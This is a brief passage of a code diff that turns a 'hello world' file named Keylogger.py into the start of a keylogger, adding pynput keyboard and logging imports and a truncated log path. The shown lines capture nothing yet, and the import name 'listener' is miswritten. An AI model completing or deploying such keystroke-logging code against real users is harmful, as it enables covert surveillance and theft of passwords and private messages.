@@ -1,3 +1,7 @@
 # Keylogger.py
  Keylogger
-print("hello world")
+import pynput
+from pynput.keyboard import Key,listener
+import logging 
+
+log_dir = r"C:/Path
